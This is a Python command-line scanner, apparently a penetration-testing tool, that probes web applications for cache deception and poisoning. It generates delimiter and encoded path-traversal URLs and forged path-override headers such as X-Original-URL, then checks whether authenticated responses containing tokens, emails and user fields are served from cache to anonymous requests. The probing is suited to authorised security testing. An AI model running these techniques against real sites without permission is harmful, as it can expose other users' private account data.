import argparse
import difflib
import logging
import random
import re
import string
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Semaphore
from typing import Dict, List, Optional, Set, Tuple

import requests
from tqdm import tqdm

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# --- Constants ---

DEFAULT_DELIMITERS = ['!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', '%21', '%22', '%23', '%24', '%25', '%26', '%27', '%28', '%29', '%2A', '%2B', '%2C', '%2D', '%2E', '%2F', '%3A', '%3B', '%3C', '%3D', '%3E', '%3F', '%40', '%5B', '%5C', '%5D', '%5E', '%5F', '%60', '%7B', '%7C', '%7D', '%7E', '%0A', '%0A%0D', '%0D']
DEFAULT_EXTENSIONS = ['.js', '.css', '.png', '.jpg', '.html']
MAX_THREADS = 10
REQUEST_TIMEOUT = 15

CACHE_HEADER_NAMES = [
    'X-Cache', 'Cf-Cache-Status', 'X-Cache-Status', 'X-Vercel-Cache',
    'X-Served-By', 'X-Cache-Hits', 'Age', 'CDN-Cache-Control',
    'X-Proxy-Cache', 'Fastly-Debug-Digest', 'X-Akamai-Cache-Status',
    'X-Drupal-Cache', 'X-Varnish', 'X-Varnish-Cache',
    'X-Edge-Cache', 'X-Cache-Lookup', 'X-Nginx-Cache', 'Cdn-Cache',
]
HIT_STRINGS = ['hit', 'revalidated', 'stale']
MISS_STRINGS = ['miss', 'dynamic', 'bypass', 'pass', 'uncacheable', 'expired', 'none']

PATH_OVERRIDE_HEADERS = [
    'X-Original-URL', 'X-Rewrite-URL', 'X-Override-URL',
    'X-HTTP-Path-Override', 'X-Original-URI', 'X-Rewrite-URI',
    'X-Forwarded-URL', 'X-Forwarded-URI', 'X-Forwarded-Path',
    'X-Proxy-URL', 'X-Real-Path', 'X-Request-URI', 'X-URL',
    'X-Original-Path', 'X-HTTP-Destination-URL', 'X-Forwarded-Host',
]

DEFAULT_AUTH_STRIP = [
    'cookie', 'authorization', 'x-auth-token', 'x-session',
    'x-session-token', 'x-access-token', 'x-api-key', 'api-key',
    'cookie2', 'x-csrf-token', 'x-access-key',
]

MARKER_PATTERNS = [
    re.compile(r'[\w.+-]+@[\w-]+\.[\w.-]+'),
    re.compile(r'\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b'),
    re.compile(r'\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b'),
    re.compile(r'\b[0-9a-fA-F]{32,}\b'),
]
JSON_FIELD_MARKER_PATTERN = re.compile(
    r'"(uid|user_id|userid|email|session|token|account|balance|phone|cpf|cnpj|ssn|secret|api[_-]?key|username|login|first_name|last_name|full_name)"\s*:\s*"?([^",}\]\s]+)"?',
    re.IGNORECASE,
)

request_semaphore = Semaphore(MAX_THREADS)


# --- Utilities ---

def print_logo():
    green = '\033[32m'
    bright_green = '\033[92m'
    reset = '\033[0m'
    logo = rf"""
{green}           .___.__                             .___
{green}  ____   __| _/|  |__   ____  __ __  ____    __| _/
{green}_/ ___\ / __ | |  |  \ /  _ \|  |  \/    \  / __ |
{green}\  \___/ /_/ | |   Y  (  <_> )  |  /   |  \/ /_/ |
{green} \___  >____ | |___|  /\____/|____/|___|  /\____ |
{green}     \/     \/      \/                  \/      \/
                                                            {bright_green}by gankd{reset}
"""
    print(logo)


def read_delimiters(wordlist_path: str) -> List[str]:
    try:
        with open(wordlist_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error(f"Wordlist file not found: {wordlist_path}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Error reading wordlist: {e}")
        sys.exit(1)


def generate_random_chars(length: int = 3) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def parse_header(header_str: str) -> Tuple[str, str]:
    if ':' not in header_str:
        logging.error(f"Invalid header format: '{header_str}'. Use 'Name: Value'.")
        sys.exit(1)
    name, value = header_str.split(':', 1)
    return name.strip(), value.strip()


def parse_headers(header_strs: List[str]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for h in header_strs:
        name, value = parse_header(h)
        out[name] = value
    return out


# --- Cache / marker helpers ---

def extract_cache_info(response) -> Dict:
    info = {'is_hit': False, 'is_miss': False, 'age': 0, 'raw': {}, 'has_signal': False}
    for name in CACHE_HEADER_NAMES:
        value = response.headers.get(name)
        if not value:
            continue
        info['raw'][name] = value
        info['has_signal'] = True
        lower = value.lower()
        if name.lower() == 'age':
            try:
                info['age'] = int(value)
                if info['age'] > 0:
                    info['is_hit'] = True
            except ValueError:
                pass
            continue
        if any(h in lower for h in HIT_STRINGS):
            info['is_hit'] = True
        elif any(m in lower for m in MISS_STRINGS):
            info['is_miss'] = True
    return info


def is_cacheable_response(cc: str) -> bool:
    cc = (cc or '').lower()
    if 'no-store' in cc:
        return False
    if 'public' in cc:
        return True
    m = re.search(r'(?:s-)?max-age\s*=\s*(\d+)', cc)
    if m and int(m.group(1)) >= 1:
        return True
    return False


def extract_markers(body: str, extra: Optional[List[str]] = None) -> Set[str]:
    if not body:
        return set()
    markers: Set[str] = set()
    for pat in MARKER_PATTERNS:
        markers.update(pat.findall(body))
    for _field, value in JSON_FIELD_MARKER_PATTERN.findall(body):
        if len(value) >= 4 and value.lower() not in ('true', 'false', 'null', 'none'):
            markers.add(value)
    if extra:
        for m in extra:
            if m and m in body:
                markers.add(m)
    return markers


def body_similarity(a: str, b: str) -> float:
    if not a or not b:
        return 0.0
    if a == b:
        return 1.0
    la, lb = len(a), len(b)
    if abs(la - lb) > max(la, lb) * 0.5:
        return 0.0
    return difflib.SequenceMatcher(None, a, b).quick_ratio()


# --- URL generators ---

def extract_static_directories(response_text: str, url: str, headers: Dict[str, str],
                                proxies: Dict[str, str]) -> Set[str]:
    static_dirs: Set[str] = set()
    pattern = r'(?:href|src|action|link\s+href|script\s+src|img\s+src)\s*=\s*["]?(/[\w\-/]+(?:\.\w+)?)'
    paths = re.findall(pattern, response_text)
    for path in paths:
        components = [p for p in path.split('/') if p]
        if not components:
            continue
        if '.' in components[-1]:
            components = components[:-1]
        current = ''
        for comp in components:
            current = f"{current}/{comp}"
            if any(k in current.lower() for k in ['static', 'css', 'js', 'images', 'img', 'assets', 'settings']):
                static_dirs.add(current)
    try:
        base_url = urllib.parse.urljoin(url, '/')
        root_resp = requests.get(base_url, headers=headers, proxies=proxies, timeout=REQUEST_TIMEOUT)
        for path in re.findall(pattern, root_resp.text):
            components = [p for p in path.split('/') if p]
            if not components:
                continue
            if '.' in components[-1]:
                components = components[:-1]
            current = ''
            for comp in components:
                current = f"{current}/{comp}"
                if any(k in current.lower() for k in ['static', 'css', 'js', 'images', 'img', 'assets']):
                    static_dirs.add(current)
    except requests.exceptions.RequestException as e:
        logging.warning(f"Could not fetch root path (/): {e}")
    return static_dirs


def create_osn_test_urls(base_url: str, static_dirs: Set[str], recursion_depth: int) -> Set[str]:
    parsed = urllib.parse.urlparse(base_url)
    original_path = parsed.path.strip('/')
    urls: Set[str] = set()
    rand = generate_random_chars()
    urls.add(f"{parsed.scheme}://{parsed.netloc}/..%2f{original_path}?{rand}")
    if recursion_depth == 1:
        base_dirs = {parts[0] for d in static_dirs if (parts := [p for p in d.split('/') if p])}
        for bd in base_dirs:
            rand = generate_random_chars()
            urls.add(f"{parsed.scheme}://{parsed.netloc}/{bd}/..%2f{original_path}?{rand}")
    else:
        for d in static_dirs:
            parts = [p for p in d.split('/') if p]
            for i in range(min(recursion_depth, len(parts))):
                cur = '/'.join(parts[:i + 1])
                rand = generate_random_chars()
                urls.add(f"{parsed.scheme}://{parsed.netloc}/{cur}/..%2f{original_path}?{rand}")
    return urls


def create_csn_test_urls(base_url: str, static_dirs: Set[str],
                          delimiters: List[str], recursion_depth: int) -> Set[str]:
    parsed = urllib.parse.urlparse(base_url)
    original_path = parsed.path.strip('/')
    urls: Set[str] = set()
    base_dirs: Set[str] = set()
    for d in static_dirs:
        parts = [p for p in d.split('/') if p]
        for i in range(min(recursion_depth, len(parts))):
            base_dirs.add('/'.join(parts[:i + 1]))
    for bd in base_dirs:
        for delim in delimiters:
            rand = generate_random_chars()
            urls.add(f"{parsed.scheme}://{parsed.netloc}/{original_path}{delim}%2f%2e%2e%2f{bd}?{rand}")
    return urls


def create_file_cache_test_urls(base_url: str, delimiters: List[str],
                                 static_files: Optional[List[str]] = None) -> Set[str]:
    parsed = urllib.parse.urlparse(base_url)
    urls: Set[str] = set()
    original_path = parsed.path.strip('/')
    common = ['robots.txt', 'index.html', 'index.php', 'sitemap.xml', 'favicon.ico', '404.html']
    if static_files:
        common.extend(static_files)
    for file in common:
        for delim in delimiters:
            rand = generate_random_chars()
            if original_path:
                urls.add(f"{parsed.scheme}://{parsed.netloc}/{original_path}{delim}%2f%2e%2e%2f{file}?{rand}")
            else:
                urls.add(f"{parsed.scheme}://{parsed.netloc}/{delim}%2f%2e%2e%2f{file}?{rand}")
    return urls


def create_test_urls(base_url: str, delimiters: List[str], extensions: List[str]) -> Set[str]:
    urls: Set[str] = set()
    parsed = urllib.parse.urlparse(base_url)
    path = parsed.path.rstrip('/')
    clean = f"{parsed.scheme}://{parsed.netloc}{path}"
    for delim in (delimiters or DEFAULT_DELIMITERS):
        for ext in extensions:
            rand = generate_random_chars()
            if delim == '/':
                urls.add(f"{clean}/{rand}{ext}")
            else:
                urls.add(f"{clean}{delim}{rand}{ext}")
    return urls


def create_pho_test_vectors(base_url: str, sensitive_path: str,
                             static_files: Optional[List[str]] = None) -> List[Dict]:
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    cacheable_paths = [
        f"/static/{generate_random_chars(8)}.css",
        f"/static/{generate_random_chars(8)}.js",
        f"/assets/{generate_random_chars(8)}.css",
        f"/assets/{generate_random_chars(8)}.js",
        f"/css/{generate_random_chars(8)}.css",
        f"/js/{generate_random_chars(8)}.js",
        f"/{generate_random_chars(8)}.css",
        f"/{generate_random_chars(8)}.js",
        f"/{generate_random_chars(8)}.jpg",
        "/robots.txt",
        "/favicon.ico",
    ]
    if static_files:
        for sf in static_files:
            if not sf.startswith('/'):
                sf = '/' + sf
            cacheable_paths.append(sf)
    vectors: List[Dict] = []
    for path in cacheable_paths:
        full_url = f"{origin}{path}"
        for hdr in PATH_OVERRIDE_HEADERS:
            vectors.append({'url': full_url, 'override_header': hdr, 'override_value': sensitive_path})
    return vectors


# --- Core check: 3-request flow (anon baseline → auth → anon retry) ---

def check_cache_behavior(vector: Dict, auth_headers: Dict[str, str], proxies: Dict[str, str],
                         filter_header: Optional[Dict[str, str]] = None,
                         verbose: bool = False,
                         extra_markers: Optional[List[str]] = None,
                         delay: float = 0.3,
                         retry_on_miss: bool = True,
                         baseline_body: str = '',
                         baseline_markers: Optional[Set[str]] = None) -> Tuple[str, bool, Dict, bool]:
    url = vector['url']
    override_header = vector.get('override_header')
    override_value = vector.get('override_value')
    if baseline_markers is None:
        baseline_markers = set()

    ua = {'User-Agent': 'r4nd0m'}
    debug = {
        'url': url,
        'override_header': override_header,
        'override_value': override_value,
    }

    try:
        # Request B: authenticated must fire FIRST so the CDN caches the auth
        # response. If an anon request went first, the CDN would cache the
        # login redirect and every subsequent auth request would hit that 302.
        auth_req = ua.copy()
        auth_req.update(auth_headers)
        if override_header and override_value:
            auth_req[override_header] = override_value
        resp_b = requests.get(url, headers=auth_req, proxies=proxies,
                              timeout=REQUEST_TIMEOUT, allow_redirects=False)
        debug['B_status'] = resp_b.status_code
        debug['B_cache'] = extract_cache_info(resp_b)
        debug['B_cc'] = resp_b.headers.get('Cache-Control', '')
        debug['B_body_len'] = len(resp_b.text)

        if filter_header:
            for key, required in filter_header.items():
                actual = resp_b.headers.get(key)
                if actual is None or required.lower() not in actual.lower():
                    if verbose:
                        logging.info(f"Skipping {url}: filter '{key}' mismatch")
                    return url, False, debug, False

        if resp_b.status_code != 200:
            return url, False, debug, False

        auth_body = resp_b.text
        auth_markers = extract_markers(auth_body, extra_markers)
        new_markers = auth_markers - baseline_markers
        debug['new_markers'] = list(new_markers)[:5]

        # Wait for CDN to commit
        time.sleep(delay)

        # Request C: anonymous retry (no auth, no override)
        resp_c = requests.get(url, headers=ua, proxies=proxies,
                              timeout=REQUEST_TIMEOUT, allow_redirects=False)
        debug['C_status'] = resp_c.status_code
        debug['C_cache'] = extract_cache_info(resp_c)
        debug['C_body_len'] = len(resp_c.text)

        if (retry_on_miss and not debug['C_cache']['is_hit']
                and resp_c.status_code == 200 and resp_c.text != auth_body):
            time.sleep(delay)
            resp_c = requests.get(url, headers=ua, proxies=proxies,
                                  timeout=REQUEST_TIMEOUT, allow_redirects=False)
            debug['C_status'] = resp_c.status_code
            debug['C_cache'] = extract_cache_info(resp_c)
            debug['C_retry'] = True

        if resp_c.status_code != 200:
            return url, False, debug, False

        anon_retry_body = resp_c.text

        # Endpoint is simply public — not a leak
        if baseline_body and baseline_body == auth_body:
            debug['note'] = 'public endpoint (baseline == B)'
            return url, False, debug, False

        # PHO false-positive filter: paths like /robots.txt and /favicon.ico are
        # often already cached with their real content, which would match B and
        # look like a leak even when the override was ignored. Fetch the same
        # path with a cache-buster query to get an origin-fresh response; if B
        # matches that, the override did nothing.
        if override_header and override_value:
            parsed_u = urllib.parse.urlparse(url)
            cb_sep = '&' if parsed_u.query else '?'
            probe_url = f"{url}{cb_sep}cb={generate_random_chars(8)}"
            try:
                probe_resp = requests.get(probe_url, headers=ua, proxies=proxies,
                                          timeout=REQUEST_TIMEOUT, allow_redirects=False)
                debug['probe_status'] = probe_resp.status_code
                if probe_resp.status_code == 200:
                    probe_body = probe_resp.text
                    debug['probe_body_len'] = len(probe_body)
                    if probe_body == auth_body or body_similarity(probe_body, auth_body) > 0.95:
                        debug['note'] = 'override ignored (auth B matches origin-fresh probe)'
                        return url, False, debug, False
            except requests.exceptions.RequestException:
                pass

        bodies_match = (auth_body == anon_retry_body)
        sim = body_similarity(auth_body, anon_retry_body)
        debug['similarity'] = round(sim, 3)
        anon_retry_markers = extract_markers(anon_retry_body, extra_markers)
        leaked = new_markers & anon_retry_markers
        debug['leaked_markers'] = list(leaked)[:5]

        cache_c = debug['C_cache']
        cache_b = debug['B_cache']
        any_signal = cache_c['has_signal'] or cache_b['has_signal']

        # Primary: cache HIT on anon retry AND body/marker match
        if cache_c['is_hit'] and (bodies_match or sim > 0.95 or leaked):
            debug['verdict_reason'] = 'cache_hit + body/marker match'
            return url, True, debug, False

        # Marker leak — strong signal even without cache header
        if leaked and (bodies_match or sim > 0.9):
            debug['verdict_reason'] = 'marker leak'
            return url, True, debug, False

        # Heuristic: no cache headers but cacheable Cache-Control + body match
        if not any_signal and bodies_match and is_cacheable_response(debug['B_cc']):
            debug['verdict_reason'] = 'heuristic (cacheable cc + body match, no cache header)'
            return url, True, debug, False

        return url, False, debug, False

    except requests.exceptions.Timeout:
        if verbose:
            logging.warning(f"Timeout: {url}")
        return url, False, debug, True
    except requests.exceptions.RequestException as e:
        if verbose:
            logging.warning(f"Error {url}: {e}")
        return url, False, debug, False


def get_technique_description(technique: str) -> str:
    return {
        'pd': "Path Delimiters — cache deception via delimiters + static extensions",
        'osn': "Origin Server Normalization — path traversal via static dirs",
        'csn': "Client/Cache-Side Normalization — delimiters + traversal",
        'fncr': "File-Name Cache Rule — common filenames with traversal",
        'pho': "Path Header Override — X-Original-URL / X-Rewrite-URL / X-Forwarded-* family",
    }.get(technique, "Unknown technique")


def main():
    print_logo()
    parser = argparse.ArgumentParser(
        description='Test for web cache deception / poisoning vulnerabilities.',
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument('url', help='Target URL (authenticated endpoint, e.g. https://app/api/me)')
    parser.add_argument('-H', '--header', required=True, action='append',
                        help='Auth header(s) "Name: Value". Repeatable.')
    parser.add_argument('-fh', '--filter-header',
                        help='Filter header "Name: Value". Only test URLs whose auth response contains it.')
    parser.add_argument('-w', '--wordlist', help='Path to custom delimiters wordlist')
    parser.add_argument('-e', '--extensions', default='.js,.css,.png',
                        help='Comma-separated extensions for PD (default: .js,.css,.png)')
    parser.add_argument('-s', '--static-files', default='',
                        help='Comma-separated extra static files/paths for FNCR and PHO')
    parser.add_argument('-T', '--technique', choices=['pd', 'osn', 'csn', 'fncr', 'pho'],
                        help="""Run one specific technique (default: all):
  pd   — Path Delimiters
  osn  — Origin Server Normalization
  csn  — Client/Cache-Side Normalization
  fncr — File-Name Cache Rule
  pho  — Path Header Override (X-Original-URL et al.)""")
    parser.add_argument('-r', type=int, choices=[1, 2, 3], default=1,
                        help='Recursion depth for OSN/CSN (default: 1)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=MAX_THREADS,
                        help=f'Thread count (default: {MAX_THREADS})')
    parser.add_argument('-p', '--proxy', help='Proxy (e.g. http://127.0.0.1:8080)')
    parser.add_argument('--delay', type=float, default=0.3,
                        help='Seconds between auth request and anon retry (default: 0.3)')
    parser.add_argument('--markers', default='',
                        help='Comma-separated extra marker strings to watch for in responses.')
    parser.add_argument('--sensitive-path',
                        help='Path to inject in PHO override headers (default: target URL path).')
    parser.add_argument('--no-retry', action='store_true',
                        help='Do not retry anon request on miss.')
    args = parser.parse_args()

    headers = parse_headers(args.header)

    filter_header = None
    if args.filter_header:
        name, value = parse_header(args.filter_header)
        filter_header = {name: value}
        print(f"[*] Filter header: {name}: {value}")

    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else {}
    if proxies:
        print(f"[*] Proxy: {args.proxy}")

    extra_markers = [m.strip() for m in args.markers.split(',') if m.strip()]
    if extra_markers:
        print(f"[*] Extra markers: {extra_markers}")
    print(f"[*] Delay between B and C: {args.delay}s")
    print(f"[*] Cache headers watched: {len(CACHE_HEADER_NAMES)}")

    static_files = [f.strip() for f in args.static_files.split(',') if f.strip()]

    sensitive_path = args.sensitive_path or urllib.parse.urlparse(args.url).path or '/'

    # Anon baseline: fetched once against args.url (not per-vector) so we don't
    # pollute the CDN cache of each test URL with an unauthenticated response.
    baseline_body = ''
    baseline_markers: Set[str] = set()
    try:
        baseline_resp = requests.get(
            args.url, headers={'User-Agent': 'r4nd0m'}, proxies=proxies,
            timeout=REQUEST_TIMEOUT, allow_redirects=False,
        )
        if baseline_resp.status_code == 200:
            baseline_body = baseline_resp.text
            baseline_markers = extract_markers(baseline_body, extra_markers)
        print(
            f"[*] Anon baseline: status={baseline_resp.status_code} "
            f"body_len={len(baseline_body)} markers={len(baseline_markers)}"
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Could not establish anon baseline: {e}")

    techniques = [args.technique] if args.technique else ['pd', 'osn', 'csn', 'fncr', 'pho']
    total = len(techniques)
    static_dirs: Optional[Set[str]] = None

    for idx, tech in enumerate(techniques, start=1):
        print(f"\n{'=' * 60}")
        print(f"[*] Technique {idx}/{total}: {tech.upper()}")
        print(f"[*] {get_technique_description(tech)}")
        print('=' * 60)

        vectors: List[Dict] = []

        if tech == 'pd':
            extensions = [e.strip() for e in args.extensions.split(',') if e.strip()]
            delimiters = read_delimiters(args.wordlist) if args.wordlist else DEFAULT_DELIMITERS
            print(f"[*] Extensions: {extensions}")
            print(f"[*] Delimiters: {len(delimiters)}")
            urls = create_test_urls(args.url, delimiters, extensions)
            vectors = [{'url': u} for u in urls]

        elif tech in ('osn', 'csn'):
            if static_dirs is None:
                try:
                    print("[*] Fetching static resource directories...")
                    init_resp = requests.get(args.url, headers=headers, proxies=proxies,
                                             timeout=REQUEST_TIMEOUT)
                    static_dirs = extract_static_directories(init_resp.text, args.url, headers, proxies)
                    if static_dirs:
                        print(f"[*] Found {len(static_dirs)} static dirs")
                        for d in sorted(static_dirs):
                            print(f"   - {d}")
                except requests.exceptions.RequestException as e:
                    print(f"[!] Init request failed: {e}")
                    continue
            if static_dirs:
                if tech == 'osn':
                    urls = create_osn_test_urls(args.url, static_dirs, args.r)
                else:
                    delimiters = read_delimiters(args.wordlist) if args.wordlist else DEFAULT_DELIMITERS
                    urls = create_csn_test_urls(args.url, static_dirs, delimiters, args.r)
                vectors = [{'url': u} for u in urls]

        elif tech == 'fncr':
            delimiters = read_delimiters(args.wordlist) if args.wordlist else DEFAULT_DELIMITERS
            urls = create_file_cache_test_urls(args.url, delimiters, static_files)
            vectors = [{'url': u} for u in urls]

        elif tech == 'pho':
            print(f"[*] Sensitive path to inject: {sensitive_path}")
            print(f"[*] Override headers tested: {len(PATH_OVERRIDE_HEADERS)}")
            vectors = create_pho_test_vectors(args.url, sensitive_path, static_files)

        if not vectors:
            print(f"[!] No vectors generated for {tech.upper()}")
            continue

        print(f"[*] {len(vectors)} vectors to test")
        print('-' * 60)

        timeouts = 0
        vulns: List[Dict] = []

        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {
                ex.submit(
                    check_cache_behavior, vec, headers, proxies, filter_header,
                    args.verbose, extra_markers, args.delay, not args.no_retry,
                    baseline_body, baseline_markers,
                ): vec for vec in vectors
            }
            for fut in tqdm(as_completed(futures), total=len(vectors), desc="Testing", unit="vec"):
                url, is_vuln, debug, had_to = fut.result()
                if had_to:
                    timeouts += 1
                if is_vuln:
                    print(f"\n\033[32m[!] VULNERABLE: {url}\033[0m")
                    if debug.get('override_header'):
                        print(f"    header: {debug['override_header']}: {debug['override_value']}")
                    if debug.get('verdict_reason'):
                        print(f"    reason: {debug['verdict_reason']}")
                    if debug.get('leaked_markers'):
                        print(f"    leaked markers: {debug['leaked_markers']}")
                    b_raw = debug.get('B_cache', {}).get('raw', {})
                    c_raw = debug.get('C_cache', {}).get('raw', {})
                    print(f"    cache B={b_raw}")
                    print(f"    cache C={c_raw}")
                    vulns.append({'url': url, 'debug': debug})
                elif args.verbose:
                    print(
                        f"[+] {url} | "
                        f"B={debug.get('B_status')} C={debug.get('C_status')} "
                        f"sim={debug.get('similarity', '?')} "
                        f"cache_c={debug.get('C_cache', {}).get('raw', {})}"
                    )

        print(f"\n[*] {tech.upper()} done. tested={len(vectors)} vulnerable={len(vulns)} timeouts={timeouts}")
        if timeouts:
            print(f"\033[33m[!] {timeouts} timeouts (timeout={REQUEST_TIMEOUT}s)\033[0m")
        if vulns:
            print("\033[32m[*] Vulnerable URLs:\033[0m")
            for v in vulns:
                print(f"   - {v['url']}")


if __name__ == "__main__":
    main()
